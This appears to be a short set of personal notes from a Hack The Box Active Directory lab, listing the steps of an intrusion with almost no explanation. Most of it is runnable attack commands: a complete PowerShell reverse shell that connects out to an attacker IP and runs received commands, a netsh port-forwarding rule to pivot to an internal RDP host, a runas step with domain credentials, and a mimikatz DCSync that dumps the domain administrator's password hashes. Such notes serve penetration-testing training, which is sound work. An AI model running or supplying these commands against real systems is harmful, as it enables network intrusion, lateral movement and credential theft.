### Login in to the Web Shell
![[Pasted image 20240502160429.png]]

### Getting a Proper reverse Shell
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.216',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Getting the IP of MS01
```
Resolve-DnsName -Name MS01
```

### Adding a Pivot Rule
```
\netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.16.199 connectport=3389 connectaddress=172.16.6.50
```

### Checking the Rule
```
\netsh.exe interface portproxy show v4tov4
```

### Using runas
```
runas /netonly /user:INLANEFREIGHT\TPETTY powershell
```

### Performing DCSync Attack
```
PS C:\htb> .\mimikatz.exe

mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```